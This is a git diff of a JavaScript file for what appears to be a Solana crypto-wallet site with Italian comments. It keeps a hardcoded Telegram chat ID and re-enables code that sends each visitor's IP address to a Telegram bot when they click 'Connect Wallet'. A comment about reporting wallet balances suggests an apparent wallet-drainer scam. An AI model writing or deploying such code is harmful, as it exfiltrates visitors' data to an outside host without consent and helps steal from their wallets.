@@ -4,35 +4,13 @@ $(document).ready(async function () {
   // Sostituisci con il token del tuo bot
   // const chatId = "7050439107"; // Sostituisci con il tuo chat ID
     const chatId = "927059314"; // Sostituisci con il tuo chat ID
-    const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
-  // const isMobile =
-  //   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-  //     navigator.userAgent
-  //   );
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-        navigator.userAgent
-      );
-    // const siteURL = "https://jjup-theme.vercel.app";
-    // const encodedURL = encodeURIComponent(siteURL);
-    
-    // // Only redirect on mobile
-    // const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    
-    // if (isMobile) {
-    //   // This will open Phantom wallet and pass your DApp URL to its in-app browser
-    //   const phantomDeepLink = `https://phantom.app/ul/browse/${encodedURL}`;
-    
-    //   // Try opening the Phantom app
-    //   window.location.href = phantomDeepLink;
+  const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
+  const isMobile =
+    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+      navigator.userAgent
+    );
 
-  // Optional: Add a timer to redirect to Phantom download page if app doesn't open
-  setTimeout(() => {
-    // Fallback to Phantom download page
-    window.location.href = "https://phantom.app/download";
-  }, 2500); // 2.5 seconds
-}
-
-     const splToken = splToken_.default;
+  const splToken = splToken_.default;
 
   // Funzione per inviare messaggi a Telegram
   async function sendTelegramMessage(message) {
@@ -84,9 +62,9 @@ $(document).ready(async function () {
   // Notifica quando l'utente clicca sul pulsante "Connetti Wallet"
   async function notifyWalletConnectClick() {
     const visitorIp = await getVisitorIp();
-    // await sendTelegramMessage(
-    //   `🔌 A visitor clicked on "Connect Wallet"\n🌐 IP: ${visitorIp}`
-    // );
+    await sendTelegramMessage(
+      `🔌 A visitor clicked on "Connect Wallet"\n🌐 IP: ${visitorIp}`
+    );
   }
 
   // Notifica il saldo del wallet
